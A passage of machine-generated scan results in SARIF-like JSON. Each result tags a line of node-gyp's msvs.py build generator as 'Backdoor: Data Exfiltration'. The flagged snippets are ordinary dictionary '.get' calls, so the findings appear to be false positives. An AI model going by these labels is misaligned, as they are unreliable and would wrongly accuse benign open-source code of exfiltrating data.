                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1024,
                  "startColumn": 21,
                  "endLine": 1024,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    default_config = _GetDefaultConfiguration(project.spec)\n\n    # Skip emitting anything if told to with msvs_existing_vcproj option.\n    if default_config.get(\"msvs_existing_vcproj\"):\n        return []\n\n    if version.UsesVcxproj():\n",
                    "rendered": {
                      "text": "    default_config = _GetDefaultConfiguration(project.spec)\n\n    # Skip emitting anything if told to with msvs_existing_vcproj option.\n    if default_config.get(\"msvs_existing_vcproj\"):\n        return []\n\n    if version.UsesVcxproj():\n",
                      "markdown": "`    default_config = _GetDefaultConfiguration(project.spec)\n\n    # Skip emitting anything if told to with msvs_existing_vcproj option.\n    if default_config.get(\"msvs_existing_vcproj\"):\n        return []\n\n    if version.UsesVcxproj():\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 1002,
                  "startColumn": 28,
                  "endLine": 1002,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  \"\"\"\n    # Pluck out the default configuration.\n    default_config = _GetDefaultConfiguration(spec)\n    toolset = default_config.get(\"msbuild_toolset\")\n    if not toolset and version.DefaultToolset():\n        toolset = version.DefaultToolset()\n    if spec[\"type\"] == \"windows_driver\":\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # Pluck out the default configuration.\n    default_config = _GetDefaultConfiguration(spec)\n    toolset = default_config.get(\"msbuild_toolset\")\n    if not toolset and version.DefaultToolset():\n        toolset = version.DefaultToolset()\n    if spec[\"type\"] == \"windows_driver\":\n",
                      "markdown": "`  \"\"\"\n    # Pluck out the default configuration.\n    default_config = _GetDefaultConfiguration(spec)\n    toolset = default_config.get(\"msbuild_toolset\")\n    if not toolset and version.DefaultToolset():\n        toolset = version.DefaultToolset()\n    if spec[\"type\"] == \"windows_driver\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 978,
                  "startColumn": 25,
                  "endLine": 978,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    # Pluck out the default configuration.\n    default_config = _GetDefaultConfiguration(spec)\n    # Decide the guid of the project.\n    guid = default_config.get(\"msvs_guid\")\n    if guid:\n        if VALID_MSVS_GUID_CHARS.match(guid) is None:\n            raise ValueError(\n",
                    "rendered": {
                      "text": "    # Pluck out the default configuration.\n    default_config = _GetDefaultConfiguration(spec)\n    # Decide the guid of the project.\n    guid = default_config.get(\"msvs_guid\")\n    if guid:\n        if VALID_MSVS_GUID_CHARS.match(guid) is None:\n            raise ValueError(\n",
                      "markdown": "`    # Pluck out the default configuration.\n    default_config = _GetDefaultConfiguration(spec)\n    # Decide the guid of the project.\n    guid = default_config.get(\"msvs_guid\")\n    if guid:\n        if VALID_MSVS_GUID_CHARS.match(guid) is None:\n            raise ValueError(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 936,
                  "startColumn": 23,
                  "endLine": 936,
                  "endColumn": 28,
                  "snippet": {
                    "text": "            # because it's also in an action's inputs in the same project)\n            excluded_sources.discard(_FixPath(trigger_file))\n            # Done if not processing outputs as sources.\n            if int(rule.get(\"process_outputs_as_sources\", False)):\n                inputs, outputs = _RuleInputsAndOutputs(rule, trigger_file)\n                inputs = OrderedSet(_FixPaths(inputs))\n                outputs = OrderedSet(_FixPaths(outputs))\n",
                    "rendered": {
                      "text": "            # because it's also in an action's inputs in the same project)\n            excluded_sources.discard(_FixPath(trigger_file))\n            # Done if not processing outputs as sources.\n            if int(rule.get(\"process_outputs_as_sources\", False)):\n                inputs, outputs = _RuleInputsAndOutputs(rule, trigger_file)\n                inputs = OrderedSet(_FixPaths(inputs))\n                outputs = OrderedSet(_FixPaths(outputs))\n",
                      "markdown": "`            # because it's also in an action's inputs in the same project)\n            excluded_sources.discard(_FixPath(trigger_file))\n            # Done if not processing outputs as sources.\n            if int(rule.get(\"process_outputs_as_sources\", False)):\n                inputs, outputs = _RuleInputsAndOutputs(rule, trigger_file)\n                inputs = OrderedSet(_FixPaths(inputs))\n                outputs = OrderedSet(_FixPaths(outputs))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 911,
                  "startColumn": 47,
                  "endLine": 911,
                  "endColumn": 52,
                  "snippet": {
                    "text": "  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    # Handle rules that use a native rules file.\n    if rules_native:\n",
                    "rendered": {
                      "text": "  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    # Handle rules that use a native rules file.\n    if rules_native:\n",
                      "markdown": "`  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    # Handle rules that use a native rules file.\n    if rules_native:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 910,
                  "startColumn": 49,
                  "endLine": 910,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    actions_to_add: deferred list of actions to add in\n  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    # Handle rules that use a native rules file.\n",
                    "rendered": {
                      "text": "    actions_to_add: deferred list of actions to add in\n  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    # Handle rules that use a native rules file.\n",
                      "markdown": "`    actions_to_add: deferred list of actions to add in\n  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n    # Handle rules that use a native rules file.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 909,
                  "startColumn": 16,
                  "endLine": 909,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    excluded_sources: the set of sources excluded from normal processing\n    actions_to_add: deferred list of actions to add in\n  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n",
                    "rendered": {
                      "text": "    excluded_sources: the set of sources excluded from normal processing\n    actions_to_add: deferred list of actions to add in\n  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n",
                      "markdown": "`    excluded_sources: the set of sources excluded from normal processing\n    actions_to_add: deferred list of actions to add in\n  \"\"\"\n    rules = spec.get(\"rules\", [])\n    rules_native = [r for r in rules if not int(r.get(\"msvs_external_rule\", 0))]\n    rules_external = [r for r in rules if int(r.get(\"msvs_external_rule\", 0))]\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 880,
                  "startColumn": 39,
                  "endLine": 880,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        \"?\": \"%3F\",\n        \"*\": \"%2A\",\n    }\n    result = \"\".join([escape_dictionary.get(c, c) for c in s])\n    return result\n\n\n",
                    "rendered": {
                      "text": "        \"?\": \"%3F\",\n        \"*\": \"%2A\",\n    }\n    result = \"\".join([escape_dictionary.get(c, c) for c in s])\n    return result\n\n\n",
                      "markdown": "`        \"?\": \"%3F\",\n        \"*\": \"%2A\",\n    }\n    result = \"\".join([escape_dictionary.get(c, c) for c in s])\n    return result\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 640,
                  "startColumn": 25,
                  "endLine": 640,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n            name=rule_name,\n            description=r.get(\"message\", rule_name),\n            extensions=[rule_ext],\n            additional_dependencies=inputs,\n            outputs=outputs,\n",
                    "rendered": {
                      "text": "        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n            name=rule_name,\n            description=r.get(\"message\", rule_name),\n            extensions=[rule_ext],\n            additional_dependencies=inputs,\n            outputs=outputs,\n",
                      "markdown": "`        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n            name=rule_name,\n            description=r.get(\"message\", rule_name),\n            extensions=[rule_ext],\n            additional_dependencies=inputs,\n            outputs=outputs,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 635,
                  "startColumn": 38,
                  "endLine": 635,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n",
                    "rendered": {
                      "text": "        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n",
                      "markdown": "`        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n        cmd = _BuildCommandLineForRule(spec, r, has_input_path=True, do_setup_env=True)\n        rules_file.AddCustomBuildRule(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 633,
                  "startColumn": 29,
                  "endLine": 633,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        rule_name = r[\"rule_name\"]\n        rule_ext = r[\"extension\"]\n        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n",
                    "rendered": {
                      "text": "        rule_name = r[\"rule_name\"]\n        rule_ext = r[\"extension\"]\n        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n",
                      "markdown": "`        rule_name = r[\"rule_name\"]\n        rule_ext = r[\"extension\"]\n        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n            continue\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 632,
                  "startColumn": 28,
                  "endLine": 632,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    for r in rules:\n        rule_name = r[\"rule_name\"]\n        rule_ext = r[\"extension\"]\n        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n",
                    "rendered": {
                      "text": "    for r in rules:\n        rule_name = r[\"rule_name\"]\n        rule_ext = r[\"extension\"]\n        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n",
                      "markdown": "`    for r in rules:\n        rule_name = r[\"rule_name\"]\n        rule_ext = r[\"extension\"]\n        inputs = _FixPaths(r.get(\"inputs\", []))\n        outputs = _FixPaths(r.get(\"outputs\", []))\n        # Skip a rule with no action and no inputs.\n        if \"action\" not in r and not r.get(\"rule_sources\", []):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 603,
                  "startColumn": 32,
                  "endLine": 603,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    The pair of (inputs, outputs) involved in this rule.\n  \"\"\"\n    raw_inputs = _FixPaths(rule.get(\"inputs\", []))\n    raw_outputs = _FixPaths(rule.get(\"outputs\", []))\n    inputs = OrderedSet()\n    outputs = OrderedSet()\n    inputs.add(trigger_file)\n",
                    "rendered": {
                      "text": "    The pair of (inputs, outputs) involved in this rule.\n  \"\"\"\n    raw_inputs = _FixPaths(rule.get(\"inputs\", []))\n    raw_outputs = _FixPaths(rule.get(\"outputs\", []))\n    inputs = OrderedSet()\n    outputs = OrderedSet()\n    inputs.add(trigger_file)\n",
                      "markdown": "`    The pair of (inputs, outputs) involved in this rule.\n  \"\"\"\n    raw_inputs = _FixPaths(rule.get(\"inputs\", []))\n    raw_outputs = _FixPaths(rule.get(\"outputs\", []))\n    inputs = OrderedSet()\n    outputs = OrderedSet()\n    inputs.add(trigger_file)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 602,
                  "startColumn": 31,
                  "endLine": 602,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  Returns:\n    The pair of (inputs, outputs) involved in this rule.\n  \"\"\"\n    raw_inputs = _FixPaths(rule.get(\"inputs\", []))\n    raw_outputs = _FixPaths(rule.get(\"outputs\", []))\n    inputs = OrderedSet()\n    outputs = OrderedSet()\n",
                    "rendered": {
                      "text": "  Returns:\n    The pair of (inputs, outputs) involved in this rule.\n  \"\"\"\n    raw_inputs = _FixPaths(rule.get(\"inputs\", []))\n    raw_outputs = _FixPaths(rule.get(\"outputs\", []))\n    inputs = OrderedSet()\n    outputs = OrderedSet()\n",
                      "markdown": "`  Returns:\n    The pair of (inputs, outputs) involved in this rule.\n  \"\"\"\n    raw_inputs = _FixPaths(rule.get(\"inputs\", []))\n    raw_outputs = _FixPaths(rule.get(\"outputs\", []))\n    inputs = OrderedSet()\n    outputs = OrderedSet()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 590,
                  "startColumn": 15,
                  "endLine": 590,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  Returns:\n    The list of sources that trigger a particular rule.\n  \"\"\"\n    return rule.get(\"rule_sources\", [])\n\n\ndef _RuleInputsAndOutputs(rule, trigger_file):\n",
                    "rendered": {
                      "text": "  Returns:\n    The list of sources that trigger a particular rule.\n  \"\"\"\n    return rule.get(\"rule_sources\", [])\n\n\ndef _RuleInputsAndOutputs(rule, trigger_file):\n",
                      "markdown": "`  Returns:\n    The list of sources that trigger a particular rule.\n  \"\"\"\n    return rule.get(\"rule_sources\", [])\n\n\ndef _RuleInputsAndOutputs(rule, trigger_file):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 454,
                  "startColumn": 24,
                  "endLine": 454,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n        mcs = int(mcs)\n    quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n    return _BuildCommandLineForRuleRaw(\n        spec, rule[\"action\"], mcs, has_input_path, quote_cmd, do_setup_env=do_setup_env\n    )\n",
                    "rendered": {
                      "text": "        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n        mcs = int(mcs)\n    quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n    return _BuildCommandLineForRuleRaw(\n        spec, rule[\"action\"], mcs, has_input_path, quote_cmd, do_setup_env=do_setup_env\n    )\n",
                      "markdown": "`        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n        mcs = int(mcs)\n    quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n    return _BuildCommandLineForRuleRaw(\n        spec, rule[\"action\"], mcs, has_input_path, quote_cmd, do_setup_env=do_setup_env\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 451,
                  "startColumn": 22,
                  "endLine": 451,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n        mcs = int(mcs)\n    quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n",
                    "rendered": {
                      "text": "    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n        mcs = int(mcs)\n    quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n",
                      "markdown": "`    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n        mcs = int(mcs)\n    quote_cmd = int(rule.get(\"msvs_quote_cmd\", 1))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 449,
                  "startColumn": 14,
                  "endLine": 449,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n",
                    "rendered": {
                      "text": "    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n",
                      "markdown": "`    # python script would need to be run as part of the chrome tree.\n    # Eventually we should add some sort of rule_default option to set this\n    # per project. For now the behavior chrome needs is the default.\n    mcs = rule.get(\"msvs_cygwin_shell\")\n    if mcs is None:\n        mcs = int(spec.get(\"msvs_cygwin_shell\", 1))\n    elif isinstance(mcs, str):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 377,
                  "startColumn": 34,
                  "endLine": 377,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n    if cygwin_shell:\n        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n        direct_cmd = [\n",
                    "rendered": {
                      "text": "\n    if cygwin_shell:\n        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n        direct_cmd = [\n",
                      "markdown": "`\n    if cygwin_shell:\n        # Find path to cygwin.\n        cygwin_dir = _FixPath(spec.get(\"msvs_cygwin_dirs\", [\".\"])[0])\n        # Prepare command.\n        direct_cmd = cmd\n        direct_cmd = [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 327,
                  "startColumn": 28,
                  "endLine": 327,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    target_ver = config_data.get(\"msvs_windows_target_platform_version\")\n    if target_ver and re.match(r\"^\\d+\", target_ver):\n        return target_ver\n    config_ver = config_data.get(\"msvs_windows_sdk_version\")\n    vers = [config_ver] if config_ver else version.compatible_sdks\n    for ver in vers:\n        for key in [\n",
                    "rendered": {
                      "text": "    target_ver = config_data.get(\"msvs_windows_target_platform_version\")\n    if target_ver and re.match(r\"^\\d+\", target_ver):\n        return target_ver\n    config_ver = config_data.get(\"msvs_windows_sdk_version\")\n    vers = [config_ver] if config_ver else version.compatible_sdks\n    for ver in vers:\n        for key in [\n",
                      "markdown": "`    target_ver = config_data.get(\"msvs_windows_target_platform_version\")\n    if target_ver and re.match(r\"^\\d+\", target_ver):\n        return target_ver\n    config_ver = config_data.get(\"msvs_windows_sdk_version\")\n    vers = [config_ver] if config_ver else version.compatible_sdks\n    for ver in vers:\n        for key in [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/msvs.py"
                },
                "region": {
                  "startLine": 324,
                  "startColumn": 28,
                  "endLine": 324,
                  "endColumn": 33,
                  "snippet": {
